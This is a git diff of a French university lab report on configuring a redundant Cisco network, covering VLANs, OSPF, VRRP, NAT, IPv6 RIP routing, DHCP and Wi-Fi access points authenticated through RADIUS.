@@ -10,15 +10,15 @@
 * [Architecture réseau](#architecture-réseau)
 * [Configuration des équipements réseau](#configuration-des-équipements-réseau)
   * [Configuration de base](#configuration-de-base)
-  * [Configuration du VLAN 530](#configuration-du-vlan-530)
   * [Configuration du VLAN 110](#configuration-du-vlan-110)
+  * [Configuration du VLAN 530](#configuration-du-vlan-530)
   * [Paramétrage du routage IPv4 OSPF](#paramétrage-du-routage-ipv4-ospf)
   * [Redondance des routeurs via le protocole VRRP](#redondance-des-routeurs-via-le-protocole-vrrp)
   * [Translation NAT statique](#translation-nat-statique)
   * [Configuration de l'accès Internet de secours](#configuration-de-laccès-internet-de-secours)
+  * [Paramétrage IPv6](#paramétrage-ipv6)
   * [Configuration du VLAN 164](#configuration-du-vlan-164)
   * [Configuration des points d'accès Wifi](#configuration-des-points-daccès-wifi)
-  * [Paramétrage IPv6](#paramétrage-ipv6)
 * [Machine virtuelle sur le serveur Capbreton](#machine-virtuelle-sur-le-serveur-capbreton)
   * [Création de la machine virtuelle](#création-de-la-machine-virtuelle)
   * [Serveur SSH](#serveur-ssh)
@@ -26,7 +26,8 @@
   * [Serveur DNS](#serveur-dns)
   * [Serveur Web](#serveur-web)
   * [Configuration DNSSEC](#configuration-dnssec)
-  * [Configuration de RADIUS (Points d'accès WPA-EAP)](#configuration-de-radius-points-daccès-wpa-eap)
+  * [Configuration du serveur RADIUS](#configuration-du-serveur-radius)
+  * [Configuration de Squid (serveur mandataire)](#configuration-de-squid-serveur-mandataire)
   * [Sécurisation des données](#sécurisation-des-données)
   * [Chiffrement des données](#chiffrement-des-données)
   * [Ferme de serveurs Web](#ferme-de-serveurs-web)
@@ -59,45 +60,45 @@ Groupe | Élève | Domaine | 193.48.57.160/28 | 10.60.0.0/16 | 2001:660:4401:60A
 
 * Plan d'adressage IPv4 :
 
-VLAN | Nom | Réseau IPv4 | Cisco 6509-E | Cisco 9200 | Cisco ISR 4331 | Routeur plateforme maths/info | PA Wifi n°1 | PA Wifi n°2
---- | --- | --- | --- | --- | --- | --- | --- | ---
-110 | TP-NET1 | 193.48.57.160/28 / 10.60.100.0/24 (local) | 10.60.100.1 | 10.60.100.2 | 10.60.100.3 | - | - | -
-530 | INTERCO-4A | 192.168.222.64/28 | 192.168.222.66 | 192.168.222.67 | - | 192.168.222.65 | - | -
-532 | INTERCO-1B | 192.168.222.80/28 | - | - | 192.168.222.82 | 192.168.222.81 | - | -
-161 | BarbieGirl | 10.60.161.0/24| 10.60.161.1 | 10.60.161.2 | - | - | 10.60.161.11 | 10.60.161.12
-162 | Zelda-BOTW | 10.60.162.0/24 | 10.60.162.1 | 10.60.162.2 | - | - | 10.60.162.11 | 10.60.162.12
-163 | Humankind | 10.60.163.0/24 | 10.60.163.1 | 10.60.163.2 | - | - | 10.60.163.11 | 10.60.163.12
-164 | DEMINEUR | 10.60.164.0/24 | 10.60.164.1 | 10.60.164.2 | - | - | 10.60.164.11 | 10.60.164.12
-165 | AnimalCrossing | 10.60.165.0/24 | 10.60.165.1 | 10.60.165.2 | - | - | 10.60.165.11 | 10.60.165.12
-166 | Rocket-League | 10.60.166.0/24 | 10.60.166.1 | 10.60.166.2 | - | - | 10.60.166.11 | 10.60.166.12
-167 | GTA | 10.60.167.0/24 | 10.60.167.1 | 10.60.167.2 | - | - | 10.60.167.11 | 10.60.167.12
-168 | Fifa | 10.60.168.0/24 | 10.60.168.1 | 10.60.168.2 | - | - | 10.60.168.11 | 10.60.168.12
-169 | Brawl-Stars | 10.60.169.0/24 | 10.60.169.1 | 10.60.169.2 | - | - | 10.60.169.11 | 10.60.169.12
-170 | Warzone | 10.60.170.0/24 | 10.60.170.1 | 10.60.170.2 | - | - | 10.60.170.11 | 10.60.170.12
-171 | Mario | 10.60.171.0/24 | 10.60.171.1 | 10.60.171.2 | - | - | 10.60.171.11 | 10.60.171.12
-172 | Battlefield | 10.60.172.0/24 | 10.60.172.1 | 10.60.172.2 | - | - | 10.60.172.11 | 10.60.172.12
-173 | Toad | 10.60.173.0/24 | 10.60.173.1 | 10.60.173.2 | - | - | 10.60.173.11 | 10.60.173.12
+VLAN | Nom | Réseau IPv4 | Cisco 6509-E | Cisco 9200 | Cisco ISR 4331 | Routeur plateforme maths/info
+--- | --- | --- | --- | --- | --- | ---
+110 | TP-NET1 | 193.48.57.160/28 / 10.60.100.0/24 (local) | 10.60.100.1 | 10.60.100.2 | 10.60.100.3 | -
+530 | INTERCO-4A | 192.168.222.64/28 | 192.168.222.66 | 192.168.222.67 | - | 192.168.222.65
+532 | INTERCO-1B | 192.168.222.80/28 | - | - | 192.168.222.82 | 192.168.222.81
+161 | BarbieGirl | 10.60.161.0/24| 10.60.161.1 | 10.60.161.2 | - | -
+162 | Zelda-BOTW | 10.60.162.0/24 | 10.60.162.1 | 10.60.162.2 | - | -
+163 | Humankind | 10.60.163.0/24 | 10.60.163.1 | 10.60.163.2 | - | -
+164 | DEMINEUR | 10.60.164.0/24 | 10.60.164.1 | 10.60.164.2 | - | -
+165 | AnimalCrossing | 10.60.165.0/24 | 10.60.165.1 | 10.60.165.2 | - | -
+166 | Rocket-League | 10.60.166.0/24 | 10.60.166.1 | 10.60.166.2 | - | -
+167 | GTA | 10.60.167.0/24 | 10.60.167.1 | 10.60.167.2 | - | -
+168 | Fifa | 10.60.168.0/24 | 10.60.168.1 | 10.60.168.2 | - | -
+169 | Brawl-Stars | 10.60.169.0/24 | 10.60.169.1 | 10.60.169.2 | - | -
+170 | Warzone | 10.60.170.0/24 | 10.60.170.1 | 10.60.170.2 | - | -
+171 | Mario | 10.60.171.0/24 | 10.60.171.1 | 10.60.171.2 | - | -
+172 | Battlefield | 10.60.172.0/24 | 10.60.172.1 | 10.60.172.2 | - | -
+173 | Toad | 10.60.173.0/24 | 10.60.173.1 | 10.60.173.2 | - | -
 
 * Plan d'adressage IPv6 :
 
-VLAN | Nom | Réseau IPv6 | Cisco 6509-E | Cisco 9200 | Cisco ISR 4331 | Routeur plateforme maths/info | PA Wifi n°1 | PA Wifi n°2
---- | --- | --- | --- | --- | --- | --- | --- | ---
-110 | TP-NET1 | 2001:660:4401:60A0::/64 | - | - | - | - | - | -
-530 | INTERCO-4A | FE80::/10 | FE80::2 | FE80::3 | - | FE80::1 | - | -
-532 | INTERCO-1B | FE80::/10 | - | - | FE80::2 | FE80::1 | - | -
-161 | BarbieGirl | 2001:660:4401:60A1::/64 / 2001:7A8:116E:60A1::/64 | - | - | - | - | - | -
-162 | Zelda-BOTW | 2001:660:4401:60A2::/64 / 2001:7A8:116E:60A2::/64 | - | - | - | - | - | -
-163 | Humankind | 2001:660:4401:60A3::/64 / 2001:7A8:116E:60A3::/64 | - | - | - | - | - | -
-164 | DEMINEUR | 2001:660:4401:60A4::/64 / 2001:7A8:116E:60A4::/64 | - | - | - | - | - | -
-165 | AnimalCrossing | 2001:660:4401:60A5::/64 / 2001:7A8:116E:60A5::/64 | - | - | - | - | - | -
-166 | Rocket-League | 2001:660:4401:60A6::/64 / 2001:7A8:116E:60A6::/64 | - | - | - | - | - | -
-167 | GTA | 2001:660:4401:60A7::/64 / 2001:7A8:116E:60A7::/64 | - | - | - | - | - | -
-168 | Fifa | 2001:660:4401:60A8::/64 / 2001:7A8:116E:60A8::/64 | - | - | - | - | - | -
-169 | Brawl-Stars | 2001:660:4401:60A9::/64 / 2001:7A8:116E:60A9::/64 | - | - | - | - | - | -
-170 | Warzone | 2001:660:4401:60AA::/64 / 2001:7A8:116E:60AA::/64 | - | - | - | - | - | -
-171 | Mario | 2001:660:4401:60AB::/64 / 2001:7A8:116E:60AB::/64 | - | - | - | - | - | -
-172 | Battlefield | 2001:660:4401:60AC::/64 / 2001:7A8:116E:60AC::/64 | - | - | - | - | - | -
-173 | Toad | 2001:660:4401:60AD::/64 / 2001:7A8:116E:60AD::/64 | - | - | - | - | - | -
+VLAN | Nom | Réseau IPv6 | Cisco 6509-E | Cisco 9200 | Cisco ISR 4331 | Routeur plateforme maths/info
+--- | --- | --- | --- | --- | --- | ---
+110 | TP-NET1 | 2001:660:4401:60A0::/64 | - | - | - | -
+530 | INTERCO-4A | FE80::/10 | FE80::2 | FE80::3 | - | FE80::1
+532 | INTERCO-1B | FE80::/10 | - | - | FE80::2 | FE80::1
+161 | BarbieGirl | 2001:660:4401:60A1::/64 / 2001:7A8:116E:60A1::/64 | - | - | - | -
+162 | Zelda-BOTW | 2001:660:4401:60A2::/64 / 2001:7A8:116E:60A2::/64 | - | - | - | -
+163 | Humankind | 2001:660:4401:60A3::/64 / 2001:7A8:116E:60A3::/64 | - | - | - | -
+164 | DEMINEUR | 2001:660:4401:60A4::/64 / 2001:7A8:116E:60A4::/64 | - | - | - | -
+165 | AnimalCrossing | 2001:660:4401:60A5::/64 / 2001:7A8:116E:60A5::/64 | - | - | - | -
+166 | Rocket-League | 2001:660:4401:60A6::/64 / 2001:7A8:116E:60A6::/64 | - | - | - | -
+167 | GTA | 2001:660:4401:60A7::/64 / 2001:7A8:116E:60A7::/64 | - | - | - | -
+168 | Fifa | 2001:660:4401:60A8::/64 / 2001:7A8:116E:60A8::/64 | - | - | - | -
+169 | Brawl-Stars | 2001:660:4401:60A9::/64 / 2001:7A8:116E:60A9::/64 | - | - | - | -
+170 | Warzone | 2001:660:4401:60AA::/64 / 2001:7A8:116E:60AA::/64 | - | - | - | -
+171 | Mario | 2001:660:4401:60AB::/64 / 2001:7A8:116E:60AB::/64 | - | - | - | -
+172 | Battlefield | 2001:660:4401:60AC::/64 / 2001:7A8:116E:60AC::/64 | - | - | - | -
+173 | Toad | 2001:660:4401:60AD::/64 / 2001:7A8:116E:60AD::/64 | - | - | - | -
 
 # Architecture réseau
 
@@ -149,7 +150,6 @@ SE2A5-R1(config)#banner motd #Restricted Access#
 * Activer le routage :
 ```
 SE2A5-R1(config)#ip routing
-SE2A5-R1(config)#ipv6 unicast-routing
 ```
 * Activer VRRP :
 ```
@@ -193,62 +193,11 @@ SE2A5-R2(config)#banner motd #Restricted Access#
 * Activer le routage :
 ```
 SE2A5-R2(config)#ip routing
-SE2A5-R2(config)#ipv6 unicast-routing
 ```
 * Activer VRRP :
 ```
 SE2A5-R2(config)#license boot level network-advantage
 SE2A5-R2(config)#fhrp version vrrp v3
-```
-
-## Configuration du VLAN 530
-
-Le VLAN 530 permet l'interconnexion avec les routeurs de la plateforme maths/info.
-
-### &ensp; &rarr; **Cisco Catalyst 6509-E**
-
-* VLAN 530 :
-```
-SE2A5-R1(config)#vlan 530
-SE2A5-R1(config-vlan)#name INTERCO-4A
-SE2A5-R1(config-vlan)#exit
-SE2A5-R1(config)#interface vlan 530
-SE2A5-R1(config-if)#description INTERCO-4A
-SE2A5-R1(config-if)#ip address 192.168.222.66 255.255.255.248
-SE2A5-R1(config-if)#no shutdown
-SE2A5-R1(config-if)#exit
-```
-* Interface d’interconnexion :
-```
-SE2A5-R1(config)#interface t6/5
-SE2A5-R1(config-if)#switchport
-SE2A5-R1(config-if)#switchport mode access
-SE2A5-R1(config-if)#switchport access vlan 530
-SE2A5-R1(config-if)#no shutdown
-SE2A5-R1(config-if)#exit
-```
-
-### &ensp; &rarr; **Cisco Catalyst 9200**
-
-* VLAN 530 :
-```
-SE2A5-R2(config)#vlan 530
-SE2A5-R2(config-vlan)#name INTERCO-4A
-SE2A5-R2(config-vlan)#exit
-SE2A5-R2(config)#interface vlan 530
-SE2A5-R2(config-if)#description INTERCO-4A
-SE2A5-R2(config-if)#ip address 192.168.222.67 255.255.255.248
-SE2A5-R2(config-if)#no shutdown
-SE2A5-R2(config-if)#exit
-```
-* Interface d’interconnexion :
-```
-SE2A5-R2(config)#interface g1/0/1
-SE2A5-R2(config-if)#switchport
-SE2A5-R2(config-if)#switchport mode access
-SE2A5-R2(config-if)#switchport access vlan 530
-SE2A5-R2(config-if)#no shutdown
-SE2A5-R2(config-if)#exit
 ```
 
 ## Configuration du VLAN 110
@@ -298,6 +247,56 @@ SE2A5-R2(config)#interface t1/1/1
 SE2A5-R2(config-if)#switchport
 SE2A5-R2(config-if)#switchport mode access
 SE2A5-R2(config-if)#switchport access vlan 110
+SE2A5-R2(config-if)#no shutdown
+SE2A5-R2(config-if)#exit
+```
+
+## Configuration du VLAN 530
+
+Le VLAN 530 permet l'interconnexion avec les routeurs de la plateforme maths/info.
+
+### &ensp; &rarr; **Cisco Catalyst 6509-E**
+
+* VLAN 530 :
+```
+SE2A5-R1(config)#vlan 530
+SE2A5-R1(config-vlan)#name INTERCO-4A
+SE2A5-R1(config-vlan)#exit
+SE2A5-R1(config)#interface vlan 530
+SE2A5-R1(config-if)#description INTERCO-4A
+SE2A5-R1(config-if)#ip address 192.168.222.66 255.255.255.248
+SE2A5-R1(config-if)#no shutdown
+SE2A5-R1(config-if)#exit
+```
+* Interface d’interconnexion :
+```
+SE2A5-R1(config)#interface t6/5
+SE2A5-R1(config-if)#switchport
+SE2A5-R1(config-if)#switchport mode access
+SE2A5-R1(config-if)#switchport access vlan 530
+SE2A5-R1(config-if)#no shutdown
+SE2A5-R1(config-if)#exit
+```
+
+### &ensp; &rarr; **Cisco Catalyst 9200**
+
+* VLAN 530 :
+```
+SE2A5-R2(config)#vlan 530
+SE2A5-R2(config-vlan)#name INTERCO-4A
+SE2A5-R2(config-vlan)#exit
+SE2A5-R2(config)#interface vlan 530
+SE2A5-R2(config-if)#description INTERCO-4A
+SE2A5-R2(config-if)#ip address 192.168.222.67 255.255.255.248
+SE2A5-R2(config-if)#no shutdown
+SE2A5-R2(config-if)#exit
+```
+* Interface d’interconnexion :
+```
+SE2A5-R2(config)#interface g1/0/1
+SE2A5-R2(config-if)#switchport
+SE2A5-R2(config-if)#switchport mode access
+SE2A5-R2(config-if)#switchport access vlan 530
 SE2A5-R2(config-if)#no shutdown
 SE2A5-R2(config-if)#exit
 ```
@@ -403,22 +402,11 @@ SE2A5-R1(config-if)#shutdown
 SE2A5-R1(config-if)#exit
 SE2A5-R1(config)#ip route 193.48.57.160 255.255.255.240 null0
 ```
-Une solution de contournement serait d'utiliser des routes statiques comme pour le routeur Cisco Catalyst 9200.
+Une solution de contournement serait d'utiliser des routes statiques comme pour le routeur Cisco Catalyst 9200 (voir ci-dessous).
 
 ### &ensp; &rarr; **Cisco Catalyst 9200**
 
-* Configuration NAT :
-```
-SE2A5-R2(config)#interface vlan 530
-SE2A5-R2(config-if)#ip nat outside
-SE2A5-R2(config-if)#exit
-SE2A5-R2(config)#interface vlan 110
-SE2A5-R2(config-if)#ip nat inside
-SE2A5-R2(config-if)#exit
-SE2A5-R2(config)#ip nat inside source static network 10.60.100.160 193.48.57.160 /28
-```
-Comme le Cisco Catalyst 9200 ne prend pas en charge le protocole NAT, nous passons par des routes statiques.
-
+Comme le Cisco Catalyst 9200 ne prend pas en charge le protocole NAT, on utilise des routes statiques :
 ```
 SE2A5-R2(config)#ip route 193.48.57.161 255.255.255.255 10.60.100.161
 SE2A5-R2(config)#ip route 193.48.57.162 255.255.255.255 10.60.100.162
@@ -440,7 +428,8 @@ Les VM devront donc avoir une configuration IP avec l'adresse locale et celle ro
 ## Configuration de l'accès Internet de secours
 
 La liaison entre les routeurs déjà présents et le routeur Cisco ISR 4331 est configurée en mode trunk (802.1q).  
-On ajoute une règle SLA afin de tester la réponse d'un routeur de l'université. Si le routeur ne répond pas, on décrémente la métrique des routeurs sur le VLAN 110 afin que le routeur ISR 4331 devienne prioritaire.
+On ajoute une règle SLA afin de tester la réponse du routeur de la plateforme maths/info situé en amont.  
+Si le routeur ne répond pas, on décrémente la métrique des routeurs sur le VLAN 110 afin que le routeur ISR 4331 devienne prioritaire.
 
 ### &ensp; &rarr; **Cisco Catalyst 6509-E**
 
@@ -496,7 +485,7 @@ SE2A5-R2(config-if)#exit
 
 ### &ensp; &rarr; **Cisco ISR 4331**
 
-#### &ensp; &ensp; **Configuration de base :**
+#### &ensp; &ensp; &ensp; **Configuration de base :**
 
 ```
 switch>enable
@@ -532,7 +521,6 @@ SE2A5-R3(config)#banner motd #Restricted Access#
 * Activer le routage :
 ```
 SE2A5-R3(config)#ip routing
-SE2A5-R3(config)#ipv6 unicast-routing
 ```
 * Activer VRRP :
 ```
@@ -540,31 +528,9 @@ SE2A5-R3(config)#license boot level network-advantage
 SE2A5-R3(config)#fhrp version vrrp v3
 ```
 
-#### &ensp; &ensp; **Pont vers le VLAN 532 :**
+#### &ensp; &ensp; &ensp; **Pont vers le VLAN 110 :**
 
-Le routeur Cisco ISR 532 ne permet pas la configuration des VLAN. Une alternative à ce problème est de passer par des ponts (BDI) pour remplacer les VLAN 532 et 110.  
-Le VLAN 532 permet l'interconnexion avec l'accès Internet de secours.
-
-* Bridge VLAN 532 :
-```
-SE2A5-R3(config)#interface bdi 532
-SE2A5-R3(config-if)#ip address 192.168.222.82 255.255.255.248
-SE2A5-R3(config-if)#no shutdown
-SE2A5-R3(config-if)#exit
-```
-* Interface d’interconnexion :
-```
-SE2A5-R3(config)#interface g0/0/0
-SE2A5-R3(config-if)#description INTERCO-1B
-SE2A5-R3(config-if)#no shutdown
-SE2A5-R3(config-if)#service instance 532 ethernet
-SE2A5-R3(config-if-srv)#encapsulation untagged
-SE2A5-R3(config-if-srv)#bridge-domain 532
-SE2A5-R3(config-if-srv)#exit
-SE2A5-R3(config-if)#exit
-```
-
-#### &ensp; &ensp; **Pont vers le VLAN 110 :**
+Le routeur Cisco ISR 4331 ne permet pas la configuration des VLAN. Une alternative à ce problème est de passer par des ponts (BDI) pour remplacer les VLAN 110 et 532.  
 
 *  Bridge VLAN 110 :
 ```
@@ -601,12 +567,38 @@ SE2A5-R3(config-if-srv)#exit
 SE2A5-R3(config-if)#exit
 ```
 
-#### &ensp; &ensp; **Translation NAT dynamique**
+#### &ensp; &ensp; &ensp; **Pont vers le VLAN 532 :**
 
-On configure une mascarade sur l'accès Internet de secours.
+Le VLAN 532 permet l'interconnexion avec l'accès Internet de secours.
+
+* Bridge VLAN 532 :
+```
+SE2A5-R3(config)#interface bdi 532
+SE2A5-R3(config-if)#ip address 192.168.222.82 255.255.255.248
+SE2A5-R3(config-if)#no shutdown
+SE2A5-R3(config-if)#exit
+```
+* Interface d’interconnexion :
+```
+SE2A5-R3(config)#interface g0/0/0
+SE2A5-R3(config-if)#description INTERCO-1B
+SE2A5-R3(config-if)#no shutdown
+SE2A5-R3(config-if)#service instance 532 ethernet
+SE2A5-R3(config-if-srv)#encapsulation untagged
+SE2A5-R3(config-if-srv)#bridge-domain 532
+SE2A5-R3(config-if-srv)#exit
+SE2A5-R3(config-if)#exit
+```
+
+#### &ensp; &ensp; &ensp; **Translation NAT dynamique :**
+
+On configure une mascarade sur l'accès Internet de secours. Pour cela, on utilise l'avant-dernière adresse du réseau routé `213.215.6.96/29` (soit l'adresse IP `213.215.6.101`).
 
 * Configuration NAT :
 ```
+SE2A5-R3(config)#interface loopback 0
+SE2A5-R3(config-if)#ip address 213.215.6.101 255.255.255.255
+SE2A5-R3(config-if)#exit
 SE2A5-R3(config)#interface bdi 532
 SE2A5-R3(config-if)#ip nat outside
 SE2A5-R3(config-if)#exit
@@ -618,9 +610,93 @@ SE2A5-R3(config)#ip nat inside source list 10 interface loopback 0 overload
 SE2A5-R3(config)#ip nat inside source static network 10.60.100.160 193.48.57.160 255.255.255.240
 ```
 
+## Paramétrage IPv6
+
+Le protocole de routage utilisé pour IPv6 est RIPv6. Le routeur Cisco Catalyst 6509-E possède une métrique plus faible que le routeur Cisco Catalyst 9200 lui permettant de devenir prioritaire pour le routage IPv6.
+
+### &ensp; &rarr; **Cisco Catalyst 6509-E**
+
+* Routage IPv6 - Protocole RIPv6 :
+```
+SE2A5-R1(config)#ipv6 unicast-routing
+SE2A5-R1(config)#ipv6 router rip tpima2a5
+SE2A5-R1(config-router)#redistribute connected metric 1
+SE2A5-R1(config-router)#redistribute rip 1 metric 1
+SE2A5-R1(config-router)#redistribute static metric 1
+SE2A5-R1(config-router)#exit
+```
+* VLAN 110 :
+```
+SE2A5-R1(config)#interface vlan 110
+SE2A5-R1(config-if)#ipv6 address 2001:660:4401:60a0::/64 eui-64
+SE2A5-R1(config-if)#ipv6 nd prefix 2001:660:4401:60a0::/64 1000 900
+SE2A5-R1(config-if)#ipv6 nd router-preference high
+SE2A5-R1(config-if)#ipv6 enable
+SE2A5-R1(config-if)#exit
+```
+* VLAN 530 :
+```
+SE2A5-R1(config)#interface vlan 530
+SE2A5-R1(config-if)#ipv6 address fe80::2 link-local
+SE2A5-R1(config-if)#ipv6 rip tpima2a5 enable
+SE2A5-R1(config-if)#ipv6 enable
+```
+
+### &ensp; &rarr; **Cisco Catalyst 9200**
+
+* Routage IPv6 - Protocole RIPv6 :
+```
+SE2A5-R2(config)#ipv6 unicast-routing
+SE2A5-R2(config)#ipv6 router rip tpima2a5
+SE2A5-R2(config-router)#redistribute connected metric 2
+SE2A5-R2(config-router)#redistribute rip 1 metric 2
+SE2A5-R2(config-router)#redistribute static metric 2
+SE2A5-R2(config-router)#exit
+```
+* VLAN 110 :
+```
+SE2A5-R2(config)#interface vlan 110
+SE2A5-R2(config-if)#ipv6 address 2001:660:4401:60a0::/64 eui-64
+SE2A5-R2(config-if)#ipv6 nd prefix 2001:660:4401:60a0::/64 1000 900
+SE2A5-R2(config-if)#ipv6 nd router-preference medium
+SE2A5-R2(config-if)#ipv6 enable
+SE2A5-R2(config-if)#exit
+```
+* VLAN 530 :
+```
+SE2A5-R2(config)#interface vlan 530
+SE2A5-R2(config-if)#ipv6 address fe80::3 link-local
+SE2A5-R2(config-if)#ipv6 rip tpima2a5 enable
+SE2A5-R2(config-if)#ipv6 enable
+SE2A5-R2(config-if)#exit
+```
+
+### &ensp; &rarr; **Cisco ISR 4331**
+
+* Activer le routage IPv6 :
+```
+SE2A5-R3(config)#ipv6 unicast-routing
+```
+*  Bridge VLAN 110 :
+```
+SE2A5-R3(config)#interface bdi 110
+SE2A5-R3(config-if)#ipv6 address 2001:660:4401:60a0::/64 eui-64
+SE2A5-R3(config-if)#ipv6 nd prefix 2001:660:4401:60a0::/64 1000 900
+SE2A5-R3(config-if)#ipv6 nd router-preference low
+SE2A5-R3(config-if)#ipv6 enable
+SE2A5-R3(config-if)#exit
+```
+* Bridge VLAN 532 :
+```
+SE2A5-R3(config)#interface bdi 532
+SE2A5-R2(config-if)#ipv6 address fe80::2 link-local
+SE2A5-R3(config-if)#ipv6 enable
+SE2A5-R3(config-if)#exit
+```
+
 ## Configuration du VLAN 164
 
-Le réseau privé utilisé principalement pour les points d'accès Wifi est `10.60.164.0/24`. Il s'agit du VLAN 164.
+Le réseau privé (VLAN 164) est utilisé principalement pour les appareils connectés aux points d'accès Wifi. La plage IPv4 concernée par le VLAN 164 est `10.60.164.0/24`.
 
 ### &ensp; &rarr; **Cisco Catalyst 6509-E**
 
@@ -642,12 +718,28 @@ SE2A5-R1(config-if)#vrrp 64 preempt
 SE2A5-R1(config-if)#vrrp 64 priority 110
 SE2A5-R1(config-if)#vrrp 64 track 1 decrement 50
 SE2A5-R1(config-if)#exit
+```
+* Interface vers Cisco Catalyst 9200 :
+```
 SE2A5-R1(config)#interface t5/4
 SE2A5-R1(config-if)#switchport trunk allowed vlan add 164
 SE2A5-R1(config-if)#exit
+```
+* Interface vers le point d'accès Wifi :
+```
 SE2A5-R1(config)#interface g3/1
 SE2A5-R1(config-if)#switchport trunk allowed vlan add 164
 SE2A5-R1(config-if)#exit
+```
+* DHCP :
+```
+SE2A5-R1(config)#ip dhcp pool DEMINEUR
+SE2A5-R1(dhcp-config)#dns 193.48.57.164
+SE2A5-R1(dhcp-config)#network 10.60.164.0 255.255.255.0
+SE2A5-R1(dhcp-config)#default-router 10.60.164.254
+SE2A5-R1(dhcp-config)#exit
+SE2A5-R1(config)#ip dhcp excluded-address 10.60.164.0 10.60.164.99
+SE2A5-R1(config)#ip dhcp excluded-address 10.60.164.150 10.60.164.255
 ```
 
 ### &ensp; &rarr; **Cisco Catalyst 9200**
@@ -662,7 +754,7 @@ SE2A5-R2(config-if)#description DEMINEUR
 SE2A5-R2(config-if)#ip address 10.60.164.2 255.255.255.0
 SE2A5-R2(config-if)#ipv6 address 2001:660:4401:60a4::/64 eui-64
 SE2A5-R2(config-if)#ipv6 nd prefix 2001:660:4401:60a4::/64 1000 900
-SE2A5-R2(config-if)#ipv6 nd router-preference high
+SE2A5-R2(config-if)#ipv6 nd router-preference medium
 SE2A5-R2(config-if)#ipv6 enable
 SE2A5-R2(config-if)#no shutdown
 SE2A5-R2(config-if)#vrrp 64 address-family ipv4
@@ -671,28 +763,34 @@ SE2A5-R2(config-if-vrrp)#priority 100
 SE2A5-R2(config-if-vrrp)#preempt
 SE2A5-R2(config-if-vrrp)#exit
 SE2A5-R2(config-if)#exit
+```
+* Interface vers Cisco Catalyst 6509-E :
+```
 SE2A5-R2(config)#interface t1/1/2
 SE2A5-R2(config-if)#switchport trunk allowed vlan add 164
 SE2A5-R2(config-if)#exit
+```
+* Interface vers le point d'accès Wifi :
+```
 SE2A5-R2(config)#interface g1/0/3
 SE2A5-R2(config-if)#switchport trunk allowed vlan add 164
 SE2A5-R2(config-if)#exit
 ```
+* DHCP :
+```
+SE2A5-R2(config)#ip dhcp pool DEMINEUR
+SE2A5-R2(dhcp-config)#dns 193.48.57.164
+SE2A5-R2(dhcp-config)#network 10.60.164.0 255.255.255.0
+SE2A5-R2(dhcp-config)#default-router 10.60.164.254
+SE2A5-R2(dhcp-config)#exit
+SE2A5-R2(config)#ip dhcp excluded-address 10.60.164.0 10.60.164.149
+SE2A5-R2(config)#ip dhcp excluded-address 10.60.164.200 10.60.164.255
+```
 
 ## Configuration des points d'accès Wifi
 
-### Cisco Catalyst 6509-E
+### &ensp; &rarr; Cisco Catalyst 6509-E
 
-* DHCP :
-```
-SE2A5-R1(config)#ip dhcp pool DEMINEUR
-SE2A5-R1(dhcp-config)#dns 193.48.57.164
-SE2A5-R1(dhcp-config)#network 10.60.164.0 255.255.255.0
-SE2A5-R1(dhcp-config)#default-router 10.60.164.254
-SE2A5-R1(dhcp-config)#exit
-SE2A5-R1(config)#ip dhcp excluded-address 10.60.164.0 10.60.164.99
-SE2A5-R1(config)#ip dhcp excluded-address 10.60.164.150 10.60.164.255
-```
 * VLAN n°1 :
 ```
 SE2A5-R1(config)#interface vlan 1
@@ -724,18 +822,8 @@ SE2A5-R1(config-if)#exit
 SE2A5-R1(config)#ip nat inside source list 164 interface t6/4 overload
 ```
 
-### Cisco Catalyst 9200
+### &ensp; &rarr; Cisco Catalyst 9200
 
-* DHCP :
-```
-SE2A5-R2(config)#ip dhcp pool DEMINEUR
-SE2A5-R2(dhcp-config)#dns 193.48.57.164
-SE2A5-R2(dhcp-config)#network 10.60.164.0 255.255.255.0
-SE2A5-R2(dhcp-config)#default-router 10.60.164.254
-SE2A5-R2(dhcp-config)#exit
-SE2A5-R2(config)#ip dhcp excluded-address 10.60.164.0 10.60.164.149
-SE2A5-R2(config)#ip dhcp excluded-address 10.60.164.200 10.60.164.255
-```
 * VLAN n°1 :
 ```
 SE2A5-R2(config)#interface vlan 1
@@ -759,9 +847,9 @@ SE2A5-R2(config-if)#no shutdown
 SE2A5-R2(config-if)#exit
 ```
 
-### Point d'accès Wifi n°1
+### &ensp; &rarr; Point d'accès Wifi n°1
 
-#### &ensp; &ensp; Configuration de base :
+#### &ensp; &ensp; &ensp; **Configuration de base :**
 
 ```
 ap>enable
@@ -804,9 +892,9 @@ SE2A5-AP1(config-if)#exit
 SE2A5-AP1(config)#ip default-gateway 10.60.101.254
 ```
 
-#### &ensp; &ensp; Réseau privé (VLAN 164) :
+#### &ensp; &ensp; &ensp; **Réseau privé (VLAN 164) :**
 
-* VLAN 164 :
+* Configuration Wifi EAP :
 ```
 SE2A5-AP1(config)#aaa authentication login EAP_DEMINEUR group RADIUS_DEMINEUR
 SE2A5-AP1(config)#radius-server host 10.60.100.164 auth-port 1812 acct-port 1813 key glopglop
@@ -848,9 +936,9 @@ L'accès SSH au PA nécessite de spécifier l'utilisation de l'algorithme de Dif
 ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc admin@10.60.101.1
 ```
 
-### Point d'accès Wifi n°2
+### &ensp; &rarr; Point d'accès Wifi n°2
 
-#### &ensp; &ensp; Configuration de base :
+#### &ensp; &ensp; &ensp; **Configuration de base :**
 
 ```
 ap>enable
@@ -893,9 +981,9 @@ SE2A5-AP2(config-if)#exit
 SE2A5-AP2(config)#ip default-gateway 10.60.101.254
 ```
 
-#### &ensp; &ensp; Réseau privé (VLAN 164) :
+#### &ensp; &ensp; &ensp; **Réseau privé (VLAN 164) :**
 
-* VLAN 164 :
+* Configuration Wifi EAP :
 ```
 SE2A5-AP2(config)#aaa authentication login EAP_DEMINEUR group RADIUS_DEMINEUR
 SE2A5-AP2(config)#radius-server host 10.60.100.164 auth-port 1812 acct-port 1813 key glopglop
@@ -923,81 +1011,6 @@ SE2A5-AP2(config-if)#encryption vlan 164 mode ciphers aes-ccm tkip
 SE2A5-AP2(config-if)#mbssid
 SE2A5-AP2(config-if)#ssid DEMINEUR2
 SE2A5-AP2(config-if)#exit
-```
-
-## Paramétrage IPv6
-
-Le protocole de routage utilisé pour IPv6 est RIPv6. Le routeur Cisco Catalyst 6509-E possède une métrique plus faible que le routeur Cisco Catalyst 9200 lui permettant de devenir prioritaire pour le routage IPv6.
-
-### &ensp; &rarr; **Cisco Catalyst 6509-E**
-
-* Routage IPv6 - Protocole RIPv6 :
-```
-SE2A5-R1(config)#ipv6 router rip tpima2a5
-SE2A5-R1(config-router)#redistribute connected metric 1
-SE2A5-R1(config-router)#redistribute rip 1 metric 1
-SE2A5-R1(config-router)#redistribute static metric 1
